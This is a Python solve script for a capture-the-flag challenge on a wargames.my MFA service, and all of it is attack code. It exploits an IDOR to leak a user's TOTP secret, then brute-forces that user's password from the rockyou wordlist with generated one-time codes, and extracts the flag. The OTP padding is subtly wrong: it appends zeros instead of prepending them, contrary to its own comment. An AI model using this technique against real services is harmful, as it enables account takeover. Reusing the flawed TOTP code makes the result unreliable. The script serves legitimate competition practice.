import hmac, base64, struct, hashlib, time
import requests
import re

def get_hotp_token(secret, intervals_no):
    key = base64.b32decode(secret, True)
    #decoding our key
    msg = struct.pack(">Q", intervals_no)
    #conversions between Python values and C structs represente
    h = hmac.new(key, msg, hashlib.sha1).digest()
    o = o = h[19] & 15
    #Generate a hash using both of these. Hashing algorithm is HMAC
    h = (struct.unpack(">I", h[o:o+4])[0] & 0x7fffffff) % 1000000
    #unpacking
    return h
def get_totp_token(secret):
    #ensuring to give the same otp for 30 seconds
    x =str(get_hotp_token(secret,intervals_no=int(time.time())//30))
    #adding 0 in the beginning till OTP has 6 digits
    while len(x)!=6:
        x+='0'
    return x

# Get secret key with the IDOR bug
URL = "http://mfa.wargames.my/"
params = {
	"username":"godam"
}
r = requests.get(URL+"getQR.php",params=params)
secret = re.findall("secret\%3D(.*)\&size",r.text)[0]


# Brute force common password with generated OTP
f = open("/opt/rockyou.txt",'r')
while text := f.readline():
	params = {
		"username":"godam",
		"password":text[:-1]
	}
	s = requests.Session()
	r = s.get(URL+"login",params=params)
	data = {
		"otp":get_totp_token(secret+"=")
	}
	r = s.post(URL+"verify",data=data)
	# print(text)
	if "index.php" in r.text:
		print("Found password: "+text)
		r = s.get(URL+"notes")
		print("Found flag: "+re.findall("wgmy{.*}", r.text)[0])
		break